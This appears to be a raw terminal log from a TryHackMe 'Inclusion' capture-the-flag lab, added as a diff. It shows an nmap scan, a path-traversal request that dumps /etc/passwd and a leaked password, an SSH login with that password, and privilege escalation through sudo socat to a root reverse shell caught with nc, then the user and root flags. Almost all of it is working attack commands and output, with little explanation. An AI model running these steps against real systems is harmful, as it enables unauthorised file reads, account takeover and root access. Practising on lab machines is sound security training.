@@ -1,0 +1,199 @@
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Inclusion]
+└─$ nmap -sC 10.10.37.213 -oN namp.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-02 17:44 EST
+Nmap scan report for 10.10.37.213
+Host is up (0.043s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh-hostkey: 
+|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
+|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
+|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
+80/tcp open  http
+|_http-title: My blog
+
+Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s http://10.10.37.213/article?name=../../../etc/passwd             
+<!DOCTYPE html>
+
+<html>
+
+    <body>
+
+        
+
+            root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
+#falconfeast:rootpassword
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+
+
+        
+
+    </body>
+
+</html>
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s http://10.10.37.213/article?name=../../../etc/passwd             
+<!DOCTYPE html>
+
+<html>
+
+    <body>
+
+        
+
+            root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
+#falconfeast:rootpassword
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+
+
+        
+
+    </body>
+
+</html>
+
+This stands out -
+#falconfeast:rootpassword
+
+┌──(kali㉿kali)-[~/Documents/TryHackMe/Inclusion]
+└─$ ssh falconfeast@10.10.37.213
+The authenticity of host '10.10.37.213 (10.10.37.213)' can't be established.
+ED25519 key fingerprint is SHA256:P/7iIMaP0XJ+fmztBwOlGFKmTzcG70wdIP+zi/K87k0.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.37.213' (ED25519) to the list of known hosts.
+falconfeast@10.10.37.213's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Dec  3 04:31:17 IST 2021
+
+  System load:  0.63              Processes:           86
+  Usage of /:   35.3% of 9.78GB   Users logged in:     0
+  Memory usage: 33%               IP address for eth0: 10.10.37.213
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+3 packages can be updated.
+3 updates are security updates.
+
+
+Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
+falconfeast@inclusion:~$ whoami
+falconfeast
+falconfeast@inclusion:~$ sudo -l
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+falconfeast@inclusion:~$ ls
+articles  user.txt
+falconfeast@inclusion:~$ cat user.txt
+60989655118397345799
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444    
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+
+falconfeast@inclusion:/$ sudo socat tcp-connect:10.9.7.162:4444 exec:sh,pty,stderr,setsid,sigint,sane
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444    
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.37.213.
+Ncat: Connection from 10.10.37.213:54350.
+sh: 0: can't access tty; job control turned off
+# whoami
+whoami
+root
+# ls
+ls
+bin   home            lib64       opt   sbin      sys  vmlinuz
+boot  initrd.img      lost+found  proc  snap      tmp  vmlinuz.old
+dev   initrd.img.old  media       root  srv       usr
+etc   lib             mnt         run   swapfile  var
+# cd root
+cd root
+# ls
+ls
+root.txt
+# cat root.txt
+cat root.txt
+42964104845495153909
